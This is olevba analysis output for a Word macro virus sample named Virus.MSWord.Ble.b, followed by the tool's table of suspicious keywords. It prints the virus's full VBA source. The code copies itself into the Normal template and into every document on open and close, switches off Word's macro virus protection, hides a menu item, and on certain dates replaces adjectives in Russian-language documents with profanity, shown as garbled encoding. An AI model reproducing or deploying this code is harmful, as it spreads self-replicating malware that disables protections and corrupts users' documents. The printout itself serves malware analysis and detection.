olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ble.b-df94a84a5a0a13340bec546f4bdb331e83b7ad25
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ble.b-df94a84a5a0a13340bec546f4bdb331e83b7ad25 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MacroBle.bas 
in file: Virus.MSWord.Ble.b-df94a84a5a0a13340bec546f4bdb331e83b7ad25 - OLE stream: 'Macros/VBA/MacroBle'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public myname$
Public Changed As Boolean
Option Base 1
Dim ends$(2, 12)
Dim Moora1$(40)
Dim Moora2$(10)
Dim Miss$(8)



'  Macro Ble - the Virus.
' It''s very simple trick. Don''t be surprize: it's a first module i
'  wrote in Visual Basic in my life !

Sub AutoOpen()
 On Error GoTo 1
 myname$ = "MacroBle"
 WordBasic.DisableAutoMacros 0
 
 If Not CheckNormal Then
  Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:=myname$, Object:=wdOrganizerObjectProjectItems
  Set mytemp = NormalTemplate.OpenAsDocument
  mytemp.SaveAs (GetPath$ + "NORMAL1.DOT")
  mytemp.Close savechanges:=wdSaveChanges
End If
GoTo 2
1:
 'MsgBox "Fuck up !"
 Resume 2
2:
End Sub
Function CheckNormal()
 cn = False
 For Each x In NormalTemplate.VBProject.VBComponents
  If x.Name = myname$ Then cn = True
 Next
 CheckNormal = cn
End Function

Function CheckActive()
 cn = False
 For Each x In ActiveDocument.VBProject.VBComponents
  If x.Name = myname$ Then cn = True
 Next
 CheckActive = cn
 End Function

Sub AutoClose()
 On Error GoTo errorlevel2
 If Not CheckActive Then Application.OrganizerCopy Source:=GetPath$ + "NORMAL1.DOT", Destination:=ActiveDocument.FullName, Name:=myname$, Object:=wdOrganizerObjectProjectItems
 If MyDate Then MakeSoviet
 GoTo end_f
errorlevel2:
 'MsgBox "More Errors !"
 Resume end_f
end_f:
End Sub

Function GetPath$()
 s$ = NormalTemplate.FullName
 s$ = Mid$(s$, 1, Len(s$) - 10)
 GetPath$ = s$
End Function

Sub AutoExec()
 Options.VirusProtection = False
 Set x = CommandBars("Tools").Controls(12)
 x.Visible = False
 x.Enabled = False
 ends$(1, 1) = "űé"
 ends$(1, 2) = "îăî"
 ends$(1, 3) = "îěó"
 ends$(1, 4) = "űě"
 ends$(1, 5) = "îě"
 ends$(1, 6) = "ŕ˙"
 ends$(1, 7) = "îé"
 ends$(1, 8) = "óţ"
 ends$(1, 9) = "űĺ"
 ends$(1, 10) = "űő"
 ends$(1, 11) = "űěč"
 ends$(1, 12) = "îĺ"
 ends$(2, 1) = "čé"
 ends$(2, 2) = "ĺăî"
 ends$(2, 3) = "ĺěó"
 ends$(2, 4) = "čě"
 ends$(2, 5) = "ĺě"
 ends$(2, 6) = "ĺé"
 ends$(2, 7) = "čĺ"
 ends$(2, 8) = "čő"
 ends$(2, 9) = "čě"
 ends$(2, 10) = "čěč"
 ends$(2, 11) = "ĺĺ"
 ends$(2, 12) = "ŕ˙"
 
 Moora1$(1) = "őóĺâ"
 Moora1$(2) = "ĺáŕíóň"
 Moora1$(3) = "ăîíčě"
 Moora1$(4) = "äĺáčëüí"
 Moora1$(5) = "ěóäŕ÷í"
 Moora1$(6) = "őđĺíîâ"
 Moora1$(7) = "äóáîâ"
 Moora1$(8) = "ńîďëčâ"
 Moora1$(9) = "ęîđ˙â"
 Moora1$(10) = "óáëţäî÷í"
 
 Moora1$(11) = "ďĺäđčëüí"
 Moora1$(12) = "ăîâí˙í"
 Moora1$(13) = "ęîçëčí"
 Moora1$(14) = "ĺáëčâ"
 Moora1$(15) = "ĺáŕí"
 Moora1$(16) = "ďčçäŕíóň"
 Moora1$(17) = "ďđčäóđîří"
 Moora1$(18) = "řčçŕíóň"
 Moora1$(19) = "ăíóńí"
 Moora1$(20) = "ńňđĺěí"
 
 Moora1$(21) = "ăíóńŕâ"
 Moora1$(22) = "ňóďîđűë"
 Moora1$(23) = "ęŕíŕëčçŕöčîíí"
 Moora1$(24) = "âčçăëčâ"
 Moora1$(25) = "ńëĺďîřŕđ"
 Moora1$(26) = "ďđűůŕâ"
 Moora1$(27) = "đâîňí"
 Moora1$(28) = "ńęëî÷í"
 Moora1$(29) = "óđîäëčâ"
 Moora1$(30) = "áîđîäŕâî÷í"
 
 Moora1$(31) = "îáńňđóőŕíí"
 Moora1$(32) = "íĺíîđěŕëüí"
 Moora1$(33) = "ďëţăŕâ"
 Moora1$(34) = "ęîń˙÷í"
 Moora1$(35) = ""
 Moora1$(36) = ""
 Moora1$(37) = ""
 Moora1$(38) = ""
 Moora1$(39) = ""
 Moora1$(40) = ""

 Moora2$(1) = "ńâčí˙÷"
 Moora2$(2) = "îőóĺâř"
 Moora2$(3) = "âîíţ÷"
 Moora2$(4) = "îőóĺâŕţů"
 Moora2$(5) = ""
 Moora2$(6) = ""
 Moora2$(7) = ""
 Moora2$(8) = ""
 Moora2$(9) = ""
 Moora2$(10) = ""
 
 Miss$(1) = "ěí"
 Miss$(2) = "ňîá"
 Miss$(3) = "ńîá"
 Miss$(4) = "ńâî"
 Miss$(5) = "ěî"
 Miss$(6) = "čőí"
 Miss$(7) = "íŕř"
 Miss$(8) = "âŕř"
End Sub

Sub MakeSoviet()
 AutoExec
 Randomize Timer
 f = System.LanguageDesignation
 If UCase$(Mid$(f, 1, 3)) = "ĐÓŃ" Then
  s = ActiveDocument.Words.Count
  If s < 200 Then effects = True Else effects = False
  For k = 1 To s
   If effects Then
    LastFont = ActiveDocument.Words(k).Font.Size
    ActiveDocument.Words(k).Font.Size = LastFont + 2
   End If
   tss$ = ActiveDocument.Words.Item(k)
   Changed = False
   If Len(tss$) > 4 Then tss$ = TrunslateWord(tss$)
   If Changed Then ActiveDocument.Words(k) = tss$
   If effects Then ActiveDocument.Words(k).Font.Size = LastFont
   Next k
  End If
End Sub

Function TrunslateWord$(ts As String)
 tw$ = ts
 Spaces = CheckSpace(ts)
 If Spaces <> 0 Then ts = Mid$(ts, 1, Len(ts) - Spaces)
 If Len(ts) > 4 Then
  If CheckAdjective(ts) Then
   c = 1
   While c <= 2
    I = 1
    While I <= 12
     CEnd$ = ends$(c, I)
     MyEnd$ = Mid$(ts, Len(ts) - Len(CEnd$) + 1, Len(CEnd$))
     If MyEnd$ = CEnd$ Then
      Changed = True
      Select Case c
       Case 1
        tw$ = Moora1$(Int(34 * Rnd + 1)) + CEnd$
       Case 2
        tw$ = Moora2$(Int(3 * Rnd + 1)) + CEnd$
      End Select
      If Spaces <> 0 Then
       For m = 1 To Spaces
        tw$ = tw$ + " "
       Next m
      End If
      If CapFirst(ts) Then tw$ = UCase$(Mid$(tw$, 1, 1)) + Mid$(tw$, 2, Len(tw$) - 1)
      I = 12
      c = 2
     End If
     I = I + 1
    Wend
    c = c + 1
   Wend
  End If
 End If
 TrunslateWord$ = tw$
End Function

Function CheckSpace(csp As String) As Integer
 spp = 0
 n = Len(csp)
 If n > 3 Then
  While (Mid$(csp, n, 1) = " ") And (n > 3)
   n = n - 1
   spp = spp + 1
  Wend
 End If
 CheckSpace = spp
End Function

Function CapFirst(cf As String) As Boolean
 cfs = False
 If UCase$(Mid$(cf, 1, 1)) = Mid$(cf, 1, 1) Then cfs = True
 CapFirst = cfs
End Function

Function CheckDoubleN_Miss(cdn As String) As Boolean
 cdbn = False
 If Len(cdn) >= 4 Then
  st3$ = Mid$(cdn, 1, Len(cdn) - 3)
  st2$ = Mid$(cdn, 1, Len(cdn) - 2)
  If Len(cdn) > 5 Then
   lst2$ = Mid$(st2$, Len(st2$) - 1, 2)
   lst3$ = Mid$(st3$, Len(st3$) - 1, 2)
  End If
  missed = False
  f = 1
  While f <= 8
   If st2$ = Miss$(f) Then missed = True
   If st3$ = Miss$(f) Then missed = True
   If missed Then f = 8
   f = f + 1
  Wend
  If lst2$ = "íí" Or lst3$ = "íí" Or missed Then cdbn = True
 End If
 CheckDoubleN_Miss = cdbn
End Function

Function MyDate() As Boolean
 dt$ = Date$
 If InStr(1, dt$, "15") <> 0 Then MyDate = True Else MyDate = False
End Function


Function CheckAdjective(adj As String) As Boolean
 cadj = False
 Set mySynInfo = SynonymInfo(adj)
 myPos = mySynInfo.PartOfSpeechList
 I = UBound(myPos)
 If I >= 1 Then If myPos(1) = wdAdjective Then cadj = True
 CheckAdjective = cadj
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
